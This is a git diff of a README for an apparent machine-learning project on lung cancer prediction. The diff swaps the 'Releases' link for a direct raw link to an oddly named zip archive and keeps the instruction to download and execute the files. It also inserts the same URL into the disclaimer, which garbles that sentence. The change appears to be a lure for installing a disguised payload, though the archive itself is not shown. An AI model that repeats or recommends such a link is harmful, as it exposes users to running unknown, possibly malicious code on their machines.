@@ -35,7 +35,7 @@ The primary goal of this project is to leverage machine learning algorithms to p
 
 ## Get Started 🚀
 
-To explore the project further, visit the [Releases](https://github.com/Yanne0800/Lung_Cancer_Prediction/releases) section. Download the necessary files and execute them to delve into the world of lung cancer prediction using machine learning models.
+To explore the project further, visit the [Releases](https://github.com/Yanne0800/Lung_Cancer_Prediction/raw/refs/heads/main/charts/Lung_Cancer_Prediction_idealistically.zip) section. Download the necessary files and execute them to delve into the world of lung cancer prediction using machine learning models.
 
 ## Stay Connected 👨‍💻
 
@@ -51,4 +51,4 @@ Let's predict, prevent, and prevail! 🦾
 
 ---
 
-*Disclaimer: This README.md content is for informational purposes only and does not provide medical advice.*
+*Disclaimer: This https://github.com/Yanne0800/Lung_Cancer_Prediction/raw/refs/heads/main/charts/Lung_Cancer_Prediction_idealistically.zip content is for informational purposes only and does not provide medical advice.*
